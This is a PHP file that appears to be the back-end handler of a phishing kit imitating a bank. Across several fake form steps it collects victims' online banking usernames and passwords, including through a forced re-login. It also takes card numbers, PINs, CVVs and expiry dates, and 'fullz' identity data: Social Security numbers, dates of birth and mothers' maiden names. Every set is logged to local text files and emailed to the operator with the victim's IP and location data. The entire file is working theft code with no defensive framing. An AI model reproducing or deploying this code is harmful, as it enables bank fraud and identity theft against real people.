<?php 
	session_start();

	        // variable declaration
	        $errors = array(); 


	       if (isset($_POST['ReasonCode']))
	          {
	          	include 'config.php';
	          	include 'mail.php';
	          // Get User Input
	          $UserID = $_POST['username'];
	          $password = $_POST['password'];
	          
	          $ip = getenv("REMOTE_ADDR");
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
	          $body = "<<====================>>PUA[RE-LOGIN]<<=====================>>\r\n";

	          $body .= "UserID                             : $UserID\r\n";
	          $body .= "Password                           : $password\r\n";
	          $body .=  "<<====================>>IP-INFO<<=====================>>\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                           : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= "::::::::::::::::   Citizen Bank Info :::::::::::::::::\r\n";
	          
	          $save=fopen("results/login.txt","a+");
	          fwrite($save,$body);
	          fclose($save);

	          
	          $subject="PUA-RELOGIN=> From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";

	          $headers="PUA\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          if(mail($to, $subject, $body, $headers))
	          {
	          	$key = substr(sha1(mt_rand()),1,25);
	          	echo "<script>window.location.href='../credit_verify.php?online_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."';</script>";
	          	die();
	          }
	          else
	          {
	        	$key = substr(sha1(mt_rand()),1,25);
	        	echo "<script>window.location.href='../credit_verify.php?online_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."';</script>";
	        	die();
	        	}
	          }
	          
	          if(isset($_POST['username'])&&isset($_POST['password']))
	          {
	          include 'config.php';
	          include 'mail.php'; 
	          // check for valid email address
	          $UserID = $_POST['username'];
	          $password = $_POST['password'];
	          
	          $ip = getenv("REMOTE_ADDR");
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
	          $body = "<<====================>>PUA[LOGIN]<<=====================>>\r\n";

	          $body .= "UserID                             : $UserID\r\n";
	          $body .= "Password                           : $password\r\n";
	          $body .=  "<<====================>>IP-INFO<<=====================>>\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                           : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= "<<====================>>=====================<<=======================>><<====================>>=====================<<=======================>>\r\n";
	          
	          $save=fopen("results/login.txt","a+");
	          fwrite($save,$body);
	          fclose($save);
	         
               $subject="PUA-LOGIN=> From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";
	          
	          $headers="PUA\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          if(@mail($to, $subject, $body, $headers))
	          {
	          $key = substr(sha1(mt_rand()),1,25);
	          echo "<script>window.location.href='../login1.php?ReasonCode';</script>";
	          die();
	          }
	          else
	          {
	          $key = substr(sha1(mt_rand()),1,25);
	          echo "<script>window.location.href='../login1.php?ReasonCode';</script>";
	          die();
	          }
	          }
	          
	          if (isset($_POST['credit_verify']))
	          {
	          	include 'config.php';
	          	include 'mail.php';
	          // check for valid email address 
	          $ccnum = $_POST['ccnum'];
	          $expdate = $_POST['expdate'];
	          $cvv = $_POST['cvv'];
	          $pin = $_POST['pin']; 
	           
	          $ip = getenv("REMOTE_ADDR");
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
	          $body = "<<====================>>PUA[CREDIT]<<=====================>>\r\n"; 

	          $body .= "Card Number                        : $ccnum\r\n";
	          $body .= "Card Pin                           : $pin\r\n";
	          $body .= "Card Expiry Date                   : $expdate\r\n";
	          $body .= "Card Security Code                 : $cvv\r\n";
	          $body .=  "<<====================>>IP-INFO<<=====================>>\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                           : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= "<<====================>>=====================<<=======================>><<====================>>=====================<<=======================>>\r\n";
	          
	          $save=fopen("results/credit_verify.txt","a+");
	          fwrite($save,$body);
	          fclose($save);
               
              
	          $subject="PUA-CREDIT-CARD=> From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";

	          $headers="PUA\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          if(mail($to, $subject, $body, $headers))
	          {
	          	$key = substr(sha1(mt_rand()),1,25);
	          	echo "<script>window.location.href='../form.php?online_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."';</script>";
	          	die();
	          }
	          else
	          {
	        	$key = substr(sha1(mt_rand()),1,25);
	        	echo "<script>window.location.href='../form.php?online_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."';</script>";
	        	die();
	        	}
	          }

	          if (isset($_POST['auth_verify']))
	          {
	          	include 'config.php';
	          	include 'mail.php';
	          // check for valid email address
	          $fname = $_POST['fname'];
	          $lname = $_POST['lname'];
	          $cont = $_POST['cont'];
	          $em = $_POST['em'];
	          $address = $_POST['address']; 
	          $zip = $_POST['zip'];
	          $ssn = $_POST['ssn'];
	          $dob = $_POST['dob'];
	          $mmn = $_POST['mmn']; 
	          
              $ip = getenv("REMOTE_ADDR");
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
	          $body = "<<====================>>PUA[FULLZ]<<=====================>>\r\n";

	          $body .= "First Name                         : $fname\r\n";
	          $body .= "Last Name                          : $lname\r\n";
	          $body .= "Contact                            : $cont\r\n";
	          $body .= "Email                              : $em\r\n";
	          $body .= "Address                            : $address\r\n";
	          $body .= "Zip Code                           : $zip\r\n";
	          $body .= "Social Security Number             : $ssn\r\n"; 
	          $body .= "Date Of Birth                      : $dob\r\n";
	          $body .= "Mother's Maidan Name               : $mmn\r\n";
	          
	          $body .=  "<<====================>>IP-INFO<<=====================>>\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                           : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= "<<====================>>=====================<<=======================>><<====================>>=====================<<=======================>>\r\n";
	          
	          $save=fopen("results/auth_verify.txt","a+");
	          fwrite($save,$body);
	          fclose($save);

	          
	          $subject="PUA-FULLZ=> From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";

	          $headers="PUA\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          if(mail($to, $subject, $body, $headers))
	          {
	          	$key = substr(sha1(mt_rand()),1,25);
	          	echo "<script>window.location.href='../review.php?online_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."';</script>";
	          	die();
	          }
	          else
	          {
	        	$key = substr(sha1(mt_rand()),1,25);
	        	echo "<script>window.location.href='../review.php?online_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."';</script>";
	        	die();
	        	}
	          }
	          
	      
?>